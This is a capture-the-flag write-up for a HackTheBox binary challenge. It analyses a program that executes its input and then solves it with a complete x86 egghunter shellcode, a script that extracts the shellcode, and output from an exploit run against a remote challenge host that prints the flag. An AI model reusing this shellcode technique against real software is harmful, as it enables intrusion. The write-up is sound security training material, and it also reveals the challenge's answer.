# Hunting

# Solution

Check the binary security

```bash
cmd: checksec --file=hunting

Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
```

Ok... not much security ... <br>

Running the program and providing any input gives a seg fault

```bash
27692 segmentation fault (core dumped)  ./hunting
```

Lets load it in ghidra <br>

From the code it is visible that the program registers an handler for the SIGALARM and launch an alarm for 3 seconds
```
signal(0xe,exit); <- call exit() when handling SIGALARM
alarm(3);
```

Since the ghidra and binary ninja decompilation was pretty innacurate, i downloaded IDA pro and use its decompiler (which came better than the others)

```c
int sub_1374()
{
  void *addr; // ST2C_4
  void *buf; // ST24_4
  int v3; // [esp-4h] [ebp-18h]
  char *dest; // [esp+4h] [ebp-10h]

  addr = (void *)sub_12E8();
  signal(14, (__sighandler_t)&exit);
  alarm(3u);
  dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0);
  if ( dest == (char *)-1 )
    sub_1118(0x4000);
  strcpy(dest, aHtbXxxxxxxxxxx);
  memset(aHtbXxxxxxxxxxx, 0, 0x25u);
  sub_1259();
  buf = malloc(0x3Cu);
  read(0, buf, 0x3Cu);
  ((void (__stdcall *)(int, void *, _DWORD))buf)(v3, buf, 0);
  return 0;
}
```

What it does is:
1. Generates a memory address [**addr = sub_12E8()**]
2. Creates and sets a signal alarm to exit after 3 seconds [**signal(14, (__sighandler_t)&exit); alarm(3u);**]
3. Map the **addr** generated to a page size (4096) [**mmap(addr, 0x1000u, 3, 49, -1, 0);**]
4. Then copies the flag to the new mapped region [**strcpy(dest, aHtbXxxxxxxxxxx);**]
5. Clears the previous flag location [**memset(aHtbXxxxxxxxxxx, 0, 0x25u);**]
6. Allocs a buffer of 60 bytes and reads those 60 bytes from STDIN [**buf = malloc(0x3Cu); read(0, buf, 0x3Cu);**] 
7. Calls the read input 

After researching, found out to exist a technique called [egg hunting](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) which basically tests memory regions to find a planted egg in the process's memory. In the case of this challenge, we need to find the memory in which the flag is placed<br>

This technique relies on systemcalls (**access** or **sigaction**) to test memory pages and then define if the planted egg is found by testing the addresses within the page. For this, i'll use the **access** syscall <br>

As stated before, the new memory location for the flag is allocated with **mmap** but we have not seen what type of addresses are generated by the very early function (function below). 

```c
int sub_12E8()
{
  unsigned int buf; // [esp+0h] [ebp-18h]
  int fd; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  read(fd, &buf, 8u);
  close(fd);
  srand(buf);
  for ( i = 0; i <= 1610612735 || (unsigned int)i > 0xF7000000; i = rand() << 16 )
    ;
  return i;
}
```

We can see that it generates an address between **1610612735** (0x5FFFFFFF) and **0xF7000000** based on a random number (the random generator is not vulnerable because it is seeded correctly) <br>

**Note**
```
testing this locally was giving me problems because i use a 64bit system. as soon as i went to a 32bit virtual machine, local testing performed as expected
```

Now, we can start crafting our egghunter to find the flag. Our egg will be the beggining of the flag (**HTB{**) beacause it has the needed 4 bytes. If we did not had it, we would need to test against lower register bytes (**AH** or **AL**, for example)<br>

The information we have about things that are important to the shellcode is:
1. A timer (3 seconds)
2. 60 bytes of payload (which is actually enough)
3. Shell code cant have null bytes
4. The flag size (from the code) is: 36 (0x24) -> HTB{X*31}

```assembly
section .text
global _start

_start:
    push 0x1b             ; push 0x1b to the stack
    pop eax               ; set eax to 0x1b (alarm syscall number)
    push 0x7F             ; push 127 to the stack
    pop ebx               ; set ebx to 127 seconds
    int 0x80              ; syscall alarm
	  mov edi, 0x7b425448   ; define the egg "HTB{" -> 0x7b425448
	  mov edx, 0x5FFFFFFF   ; define starting address  

next_page:
    or dx, 0xfff          ; increment to 0x60000000 (first run)

next_address:
    inc edx               ; increment memory region to test
    pusha                 ; save GP registers
    lea ebx, [edx]        ; load the address to test into ebx
    mov al, 0x21          ; load the access syscall number
    xor ecx,ecx           ; clear ecx for access mode
    int 0x80              ; syscall address
    cmp al, 0xf2          ; compare result against EFAULT  
    popa                  ; restore stack stored GP registers
    jz next_page          ; IF 0 -> test next page   (cannot access)
    cmp [edx], edi        ; compare the EGG against the value withtin the valid address  
    jnz next_address      ; IF != 0 -> test next address, else matches  
    push 0x4              ; Push 0x4 into stack (write syscall)
    pop eax               ; set eax to 0x4
    xor ebx,ebx           ; clear EBX  
    inc bl                ; set EBX to 1 (File Descriptor) -> STDOUT  
    mov ecx, edx          ; load the address found into ECX (third argument)
    push 0x24             ; push the size of the flag into the stack    
    pop edx               ; set EDX to flag size (populate write's 4th argument)
    int 0x80              ; syscall write
    jmp _start            ; Jmp to the beggining 
```

Then, to assemble and extract the shellcode itself, i wrote a small bash (**exec.sh**) script that does it
```bash 
#!/bin/bash

echo -e "Assemlbing..."
nasm -f elf32 code.asm

echo -e "Linking..."
ld -melf_i386 -s -o runnable code.o

echo -e "\n############ ->    SHELL CODE   <- ###################"
objdump -d ./code.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/
```

In order to check it locally, i used **strace** to view what the shellcode was doing in an higher level
```bash
echo -ne "outputed_shell_code" | strace ./hunting  > output
```

The output genarated show that it, in the remote, it will give us what we want
```
HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

You might be asking some things:
1. Why setting the alarm in the beggining ?!
2. Why jumping to the start at the end ?!

The answers are quite simple and straightforward:
1. Resetting the alarm overrides previous calls
2. This is a bit longer (check below) 

After calling the write syscall, the code had no further instructions on where to continue and so, it will execute some random instruction leading to a SIGSEV <br> 
This behavior may not give us the needed time to transfer the flag accross the network. By restarting the whole process (jumping to the start), we are giving the network time to transfer the bytes and then, when the flag is completely received, we can close the connection and thus kill the process <br>

**Note:** In this note's folder, both resources (the bash to generate the payload, and the python to execute it) will be present

After putting the shellcode into the python exploit helper, we got it!!!

```bash
cmd: python exp.py

[*] Connecting to remote host
[+] Opening connection to 139.59.178.146 on port 31505: Done
[p] Sending shellcode....
[*] Waiting response...
[+] Here you have: b'HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}'
[*] Closed connection to 139.59.178.146 port 31505
```

## FLAG: HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}